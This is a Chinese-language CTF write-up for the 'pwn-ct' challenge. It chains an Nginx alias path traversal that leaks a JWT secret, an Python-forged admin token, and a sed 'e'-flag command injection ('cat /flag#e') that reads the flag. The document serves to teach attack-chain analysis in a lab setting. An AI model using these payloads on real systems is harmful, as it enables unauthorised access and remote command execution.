# pwn-ct Writeup

## 题目概览

这题表面上叫 `pwn-ct`，但真正的利用链更偏 Web 配置漏洞 + 命令执行。

整条链路一共分 3 步：

1. 利用 Nginx `alias` 配置错误，任意读取 `/var/www/app/config.yaml`
2. 从配置文件里拿到 JWT 密钥，伪造管理员 token
3. 利用 `/api/config/update` 中对用户输入的危险拼接，触发 `sed` 命令执行，读取 `/flag`

最终拿到的 flag 是：

```text
polarisctf{09a313ce-0c38-4603-a0ef-af98c19a6f3b}
```

---

## 一、先看什么

这题给到的本地附件里，最值得先看的不是前端页面，而是 Nginx 配置文件 [nginx/default.conf](/mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/nginx/default.conf)。

原因很简单：

1. 它是唯一直接给出的后端侧材料
2. 里面往往会直接泄露路由、后端服务端口、鉴权方式、配置文件路径
3. 这类题很多时候题眼就在代理层配置

打开配置后，优先看下面几段。

### 1. `/static` 这段

见 [nginx/default.conf:10](/mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/nginx/default.conf#L10) 到 [nginx/default.conf:12](/mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/nginx/default.conf#L12)：

```nginx
location /static {
    alias /var/www/static/;
}
```

这段是第一个漏洞点。

`location /static` 没有以 `/` 结尾，但 `alias /var/www/static/` 以 `/` 结尾。这是一个非常经典的 Nginx `alias traversal` 配置错误。

它会导致：

```text
/static../app/config.yaml
```

这种路径在拼接后逃出 `/var/www/static/`，实际读到上级目录中的文件。

也就是说，本来只想开放静态目录，实际上却能读到 `/var/www/app/` 下面的文件。

### 2. `/api/config/` 这段

见 [nginx/default.conf:25](/mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/nginx/default.conf#L25) 到 [nginx/default.conf:34](/mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/nginx/default.conf#L34)：

```nginx
# Backend: config-service (:3002), JWT: /var/www/app/config.yaml
location /api/config/ {
    proxy_pass http://127.0.0.1:3002;
}
```

这段给了两个特别关键的信息：

1. 配置服务在 `127.0.0.1:3002`
2. JWT 配置文件路径就是 `/var/www/app/config.yaml`

这等于直接把敏感文件目标告诉我们了。

### 3. `/admin/config/` 这段

见 [nginx/default.conf:47](/mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/nginx/default.conf#L47) 到 [nginx/default.conf:59](/mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/nginx/default.conf#L59)：

```nginx
# allow 10.10.0.0/24;
# allow 127.0.0.1;
# deny all;
# [2024-12-20] Ops temporarily disabled IP restriction for network debugging
location /admin/config/ {
    proxy_pass http://127.0.0.1:3002/api/config/;
}
```

这里说明原本应该有 IP 白名单限制，但被临时注释掉了。

也就是说，只要我们能伪造出合法 JWT，就能从外部直接访问配置管理接口。

---

## 二、第一步打点：读配置文件

根据上面的 `alias traversal`，直接访问：

```text
/static../app/config.yaml
```

远程实际返回了：

```yaml
jwt_secret: "iot-guardian-s3cret-key-2024"
data_dir: "/data/devices"
backup_dir: "/data/backups"
```

这里最重要的是：

```text
jwt_secret: iot-guardian-s3cret-key-2024
```

到这一步，其实已经可以确定第一段利用链成立：

1. `/static` 配置错误
2. 成功越界读取 `/var/www/app/config.yaml`
3. 拿到 JWT 密钥

---

## 三、第二步打点：伪造管理员 JWT

既然配置里给了 `jwt_secret`，那就直接按 HS256 伪造 token。

我使用的 payload 很简单：

```json
{"user":"admin","role":"admin"}
```

Python 生成方式如下：

```python
import jwt

secret = "iot-guardian-s3cret-key-2024"
token = jwt.encode({"user": "admin", "role": "admin"}, secret, algorithm="HS256")
print(token)
```

带上：

```http
Authorization: Bearer <token>
```

之后，下面这些接口都能访问：

```text
GET /api/config/list
GET /api/config/view?device_id=cam-01
GET /api/logs?level=ERROR
```

这一步证明了第二段链路成立：文件读取不只是信息泄露，而是能直接转成后台管理权限。

---

## 四、接下来先分析哪个接口

拿到管理员权限后，不要一上来就盲扫所有路由。

优先看最“危险”的那个接口：`POST /api/config/update`

原因是：

1. `list` 和 `view` 基本是只读
2. `logs` 也是查询类接口
3. `update` 是唯一明显会“修改配置内容”的接口，最容易出现命令拼接、模板拼接、文本处理器拼接问题

所以接下来的重点就是分析 `/api/config/update`。

---

## 五、怎么分析 `/api/config/update`

题目没有给 config-service 源码，所以这里只能走黑盒推理。

### 1. 先观察它到底做了什么

发送：

```json
{
  "device_id": "cam-01",
  "old_value": "DefaultSSID",
  "new_value": "X"
}
```

返回结果里，原来的这一行：

```text
ssid = DefaultSSID
```

变成了：

```text
X
```

这说明它不是“把值改成 X”，而是“把整一行替换成了 X”。

这已经很像文本处理命令，例如：

```bash
sed '/pattern/c replacement' file
```

或者：

```bash
sed 's#^.*pattern.*$#replacement#' file
```

### 2. 再测 `old_value`

继续测试后发现：

1. `old_value='.'` 可以命中所有非空行
2. `old_value` 不能带大多数正则字符
3. 服务端会提示 `invalid old_value: must be alphanumeric`

这说明后端对 `old_value` 有过滤，但过滤并不严，至少 `.` 还能通过。

### 3. 再测 `new_value`

`new_value` 的现象更关键：

1. `X#` 会成功，结果只剩 `X`
2. `X #` 会成功，结果变成 `X `
3. `X"#` 会成功，结果变成 `X"`
4. `X'#` 会成功，结果变成 `X'`
5. `X#Y` 会直接 500

这个行为非常像 `#` 被当成了 `sed` 替换表达式的分隔符。

也就是说，后端极可能在做这种拼接：

```bash
sed 's#^.*DefaultSSID.*$#<new_value>#' /data/devices/cam-01.conf
```

如果 `new_value` 里再出现一个 `#`，就能提前闭合替换串。

于是：

```text
X#Y
```

会被解释成：

```text
s#pattern#X#Y
```

后面的 `Y` 会被当成非法 flag，所以返回 500。

这一步就是整题最核心的黑盒推理。

---

## 六、真正漏洞点是什么

`/api/config/update` 的真实漏洞不是“普通替换逻辑有 bug”，而是：

**用户可控的 `new_value` 被直接拼进了 `sed` 替换表达式，而且没有正确转义分隔符和 flag。**

GNU `sed` 有一个非常危险的特性：

```text
s/regexp/replacement/e
```

末尾的 `e` flag 会把替换结果当成 shell 命令执行。

如果这里的分隔符是 `#`，那么 payload 就可以写成：

```text
cat /flag#e
```

它会把整条表达式变成：

```text
s#^.*DefaultSSID.*$#cat /flag#e
```

意思就是：

1. 找到匹配 `DefaultSSID` 的那一整行
2. 用字符串 `cat /flag` 作为替换结果
3. 再加上 `e` flag
4. `sed` 把 `cat /flag` 当 shell 命令执行
5. 命令输出再作为最终替换内容写回返回结果

这就是标准的命令执行。

---

## 七、一步一步打通

完整利用流程如下。

### Step 1. 读取 JWT 配置

请求：

```http
GET /static../app/config.yaml
```

得到：

```yaml
jwt_secret: "iot-guardian-s3cret-key-2024"
```

### Step 2. 伪造管理员 token

使用：

```json
{"user":"admin","role":"admin"}
```

配合密钥：

```text
iot-guardian-s3cret-key-2024
```

生成 HS256 JWT。

### Step 3. 确认管理员接口可访问

请求：

```http
GET /api/config/list
Authorization: Bearer <token>
```

返回 200，说明管理员权限已经拿到。

### Step 4. 用 `update` 触发命令执行

发送：

```http
POST /api/config/update
Authorization: Bearer <token>
Content-Type: application/json
```

请求体：

```json
{
  "device_id": "cam-01",
  "old_value": "DefaultSSID",
  "new_value": "cat /flag#e"
}
```

服务端返回的 `output` 中，原本 `[network]` 下面的那一行被替换成了：

```text
polarisctf{09a313ce-0c38-4603-a0ef-af98c19a6f3b}
```

于是拿到 flag。

---

## 八、利用脚本

我把完整利用脚本整理到了 [solve_remote.py](/mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/solve_remote.py)。

关键逻辑见：

1. 读取配置文件拿 secret： [solve_remote.py:23](/mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/solve_remote.py#L23) 到 [solve_remote.py:32](/mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/solve_remote.py#L32)
2. 伪造管理员 JWT： [solve_remote.py:34](/mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/solve_remote.py#L34) 到 [solve_remote.py:35](/mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/solve_remote.py#L35)
3. 利用 `cat /flag#e` 读取 flag： [solve_remote.py:42](/mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/solve_remote.py#L42) 到 [solve_remote.py:56](/mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/solve_remote.py#L56)

直接运行：

```bash
python3 /mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/pwn-ct/solve_remote.py
```

就会自动打完整条链并输出 flag。

---

## 九、总结

这题的核心不是某一个单点，而是三处问题串起来：

1. Nginx `alias` 配置错误，导致任意文件读取
2. JWT 密钥放在可读配置中，导致可伪造管理员身份
3. `update` 接口把用户输入直接拼进 `sed`，最终导致命令执行

如果只看单点：

1. 只有文件读取，最多是信息泄露
2. 只有 JWT 泄露，最多是越权
3. 只有 `update`，未授权用户还打不到

但三者一串，就直接从外网打到 RCE，再拿 `/flag`。

这也是这题最值得学习的地方：**不要把每个漏洞孤立地看，要学会把“读文件 -> 拿密钥 -> 伪造身份 -> 命令执行”连成一条完整攻击链。**
